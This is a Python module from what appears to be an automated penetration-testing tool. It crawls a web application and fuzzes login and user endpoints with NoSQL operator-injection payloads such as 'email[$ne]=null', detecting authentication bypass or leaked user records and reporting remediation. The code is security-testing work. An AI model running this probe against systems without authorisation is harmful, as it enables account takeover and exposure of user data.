"""Fuzzed NoSQL injection probe: 17 payloads against discovered query endpoints.

Targets MongoDB and CouchDB-style NoSQL backends. Sends operator-injection
payloads as query string values (e.g. `email[$ne]=null`, `email[$gt]=`).
Many Express + Mongoose stacks parse `[$op]=value` into Mongo query
operators because of bodyParser/qs default behavior.

Detection: response status 200 with body shape suggesting authentication
bypass or unrestricted query (returns more rows than baseline, or a
non-error JSON shape on a normally-rejecting endpoint).
"""
from __future__ import annotations

import asyncio
import logging
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.payloads.library import NOSQL_PAYLOADS, fuzz
from engine.probes.recon.crawler import run_crawler

logger = logging.getLogger("pentest-ai.probes.web.nosql_fuzz")

ALWAYS_PROBED_TEMPLATES: tuple[str, ...] = (
    "/api/login?email={payload}",
    "/api/auth/login?email={payload}",
    "/rest/user/login?email={payload}",
    "/api/users?email={payload}",
    "/api/Users?email={payload}",
    "/api/users/find?email={payload}",
    "/api/account?id={payload}",
)

NOSQL_PATH_HINTS: tuple[str, ...] = (
    "/login",
    "/users",
    "/account",
    "/find",
    "/profile",
    "/auth",
)


def _make_detect_fn():
    """Hit conditions for NoSQL injection on a typical 401/200 boundary.

    We assume the baseline (clean param) returns 401 or an empty result.
    Operator injection succeeds when status flips to 200 with a token-shape
    or user-shape body, OR a results array that's much larger than baseline.
    """

    def detect(status: int, _headers: dict[str, str], body: str, baseline: str) -> bool:
        if status == 0:
            return False
        # Token-shape: typical login bypass returns a JWT
        if (
            status == 200
            and ('"token"' in body or '"authentication"' in body)
            and '"token"' not in baseline
            and '"authentication"' not in baseline
        ):
            return True
        # User-shape: response leaks email/role fields
        if (
            status == 200
            and ('"email"' in body and '"role"' in body)
            and not ('"email"' in baseline and '"role"' in baseline)
        ):
            return True
        # Body grew significantly with status 200
        return bool(
            status == 200
            and baseline
            and len(body) >= 3.0 * max(len(baseline), 1)
        )

    return detect


def _candidates(crawl) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for tpl in ALWAYS_PROBED_TEMPLATES:
        if tpl not in seen:
            seen.add(tpl)
            out.append(tpl)

    for path in crawl.api_paths | crawl.discovered_paths:
        path_lc = path.lower()
        if not any(h in path_lc for h in NOSQL_PATH_HINTS):
            continue
        for param in ("email", "username", "id", "user"):
            tpl = f"{path}?{param}={{payload}}"
            if tpl not in seen:
                seen.add(tpl)
                out.append(tpl)

    return out[:25]


def _emit(target: str, payload: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"NoSQL injection on {target} via operator payload",
        "severity": "high",
        "category": "injection",
        "target": target,
        "evidence": f"payload={payload[:80]} :: {evidence[:200]}",
        "bug_class": "nosql_injection",
        "remediation": (
            "Reject query parameters containing $-prefixed keys server side. "
            "Use a typed Mongo query builder; never spread req.query into a query."
        ),
    }


@registry.probe(
    name="web.nosql_fuzz",
    bug_class="nosql_injection",
    severity_max="high",
    owasp="A03:2021",
    runtime_budget_s=20.0,
    tags=("anonymous", "high-roi", "fuzzing", "uses-crawler"),
    requires_auth=False,
)
async def probe_nosql_fuzz(ctx: ProbeContext) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    seen_targets: set[str] = set()

    try:
        crawl = await run_crawler(ctx.session, ctx.base)
    except Exception as exc:  # noqa: BLE001
        logger.warning("crawler failed during nosql_fuzz: %s", exc)
        return findings

    templates = _candidates(crawl)
    if not templates:
        return findings

    detect = _make_detect_fn()
    base = ctx.base.rstrip("/")

    for path_template in templates:
        url_template = (
            path_template
            if path_template.startswith(("http://", "https://"))
            else base + path_template
        )
        target_id = url_template.split("?", 1)[0].rstrip("/")
        if target_id in seen_targets:
            continue
        try:
            results = await asyncio.wait_for(
                fuzz(
                    ctx.session,
                    url_template,
                    NOSQL_PAYLOADS,
                    detect,
                    concurrency=6,
                ),
                timeout=10,
            )
        except (asyncio.TimeoutError, Exception):
            continue

        hits = [r for r in results if r.get("hit")]
        if hits:
            seen_targets.add(target_id)
            best = hits[0]
            findings.append(
                _emit(target_id, best["payload"], best.get("body_snippet", "")[:200])
            )

    return findings
